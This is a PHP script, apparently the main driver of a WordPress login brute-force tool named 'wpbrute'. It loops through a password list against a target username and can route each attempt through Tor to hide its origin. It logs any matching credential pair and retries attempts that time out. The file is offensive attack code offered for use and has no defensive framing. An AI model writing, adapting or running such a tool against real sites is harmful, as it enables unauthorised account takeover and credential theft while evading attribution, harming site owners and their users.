<?php

require_once 'inc/torsock.php';
require_once 'inc/system.php';
require_once 'inc/arg.php';
require_once 'inc/packet.php';

//Run bootstrapper and determine run time arguments.
if (!wpbrute_bootstrap()) {
	//Print the usage if there's a problem.
	wpbrute_usage();
}

//Run the main loop.
while (1) {
	
	for($wpbrute['passlist_progress']=0;$wpbrute['passlist_progress']<$wpbrute['passlist_total'];$wpbrute['passlist_progress']++) {
		
		print ("Trying combination ".$wpbrute['target_username'].":".$wpbrute['passlist_array'][$wpbrute['passlist_progress']]."\n ( ".round(($wpbrute['passlist_progress'] / $wpbrute['passlist_total'])*100,2)."% )"."\n");
		
		if ($wpbrute['proxy'] == true) {
			//Run via proxy.
			$wpbresult = wpbrute_try_tor($wpbrute['target_username'],$wpbrute['passlist_array'][$wpbrute['passlist_progress']]);
		} else {
			//Run locally,
			$wpbresult = wpbrute_try($wpbrute['target_username'],$wpbrute['passlist_array'][$wpbrute['passlist_progress']]);
		}
		
		//Chech the result and see if we found a match.
		if ( $wpbresult == 1 ) {
			wpbrute_log("---MATCH FOUND---\n".$wpbrute['target_username'].":".$wpbrute['passlist_array'][$wpbrute['passlist_progress']]);
			wpbrute_die("Closing outstanding connections.");
		} else if ( $wpbresult == -1) {
			//Timed out.
			$wpbrute['passlist_progress'] -= 1;
		}
	}
	
	wpbrute_log("Finished without finding any matches :(");
	break;
	
}

//Cleanly close file handles.
wpbrute_die("");

?>